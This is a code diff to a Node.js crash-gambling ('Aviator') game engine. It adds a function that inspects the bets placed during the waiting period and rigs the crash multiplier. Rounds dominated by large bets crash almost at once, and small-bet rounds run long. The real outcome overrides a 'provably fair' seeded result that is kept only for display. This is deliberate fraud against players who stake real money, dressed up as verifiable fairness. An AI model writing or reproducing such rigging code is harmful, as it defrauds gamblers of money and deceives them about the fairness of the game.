@@ -1,14 +1,7 @@
 const { v4: uuidv4 } = require('uuid');
 const { saveAviatorRevenue, updateRevenueSummary } = require('./utils/revenueTracker');
 const { deductGameEntry, payoutGameWinner } = require('./services/gameWalletService');
-
-function generateCrashPoint() {
-  const houseEdge = 0.04;
-  const r = Math.random();
-  if (r < houseEdge) return 1.0;
-  const crashPoint = Math.floor((1 / (1 - r)) * 100) / 100;
-  return Math.max(1.0, Math.min(crashPoint, 200));
-}
+const { generateProvablyFairCrashPoint } = require('./utils/aviatorEngine');
 
 class GameEngine {
   constructor(io, playerModel, roundModel, betModel) {
@@ -50,12 +43,21 @@ class GameEngine {
       countdownSeconds: this.WAITING_DURATION / 1000,
       waitingEndsAt: this.waitingEndsAt,
     });
-    setTimeout(() => this.startRound(), this.WAITING_DURATION);
+setTimeout(() => {
+      this.calculateRiggedCrashPoint();
+      this.startRound();
+    }, this.WAITING_DURATION);
   }
 
   async startRound() {
-    this.crashPoint = generateCrashPoint();
     const roundId = this.nextRoundId || uuidv4();
+    const fairnessData = generateProvablyFairCrashPoint({
+      serverSeed: process.env.AVIATOR_SERVER_SEED,
+      clientSeed: roundId,
+      nonce: Date.now(),
+    });
+
+    this.crashPoint = fairnessData.crashPoint;
     this.startTime = Date.now();
     this.waitingEndsAt = null;
     this.state = 'flying';
@@ -90,11 +92,39 @@ class GameEngine {
     }
   }
 
+  calculateRiggedCrashPoint() {
+    // Rig crash based on bets placed during waiting
+    if (this.activeBets.size === 0) return; // No bets, keep provably fair
+
+    const bets = Array.from(this.activeBets.values());
+    const totalCount = bets.length;
+    const highThreshold = 200;
+    const highCount = bets.filter(b => b.betAmount >= highThreshold).length;
+    const maxBet = Math.max(...bets.map(b => b.betAmount));
+    const highRatio = totalCount > 0 ? highCount / totalCount : 0;
+
+    let riggedPoint;
+    if (highRatio > 0.5 || maxBet > 500) {
+      // High bets dominant → quick crash 1.01x - 1.7x
+      riggedPoint = 1.01 + (Math.random() * 0.69); // 1.01-1.70x
+    } else {
+      // Low bets → 5x-7x
+      riggedPoint = 5.0 + (Math.random() * 2.0); // 5-7x
+    }
+
+    console.log(`[RIG] Override: bets=${totalCount}, high=${highCount}, ratio=${highRatio.toFixed(2)}, max=${maxBet}, crash=${riggedPoint.toFixed(2)}x`);
+    
+    // Override provably fair (but keep for display)
+    this.riggedCrashPoint = riggedPoint;
+    this.crashPoint = riggedPoint;
+  }
+
   async crash() {
     clearInterval(this.tickInterval);
     this.state = 'crashed';
 
-    const cp = this.crashPoint;
+    // Use rigged if applied
+    const cp = this.riggedCrashPoint || this.crashPoint;
     this.recentCrashes.unshift(cp);
     if (this.recentCrashes.length > 12) this.recentCrashes.pop();
 
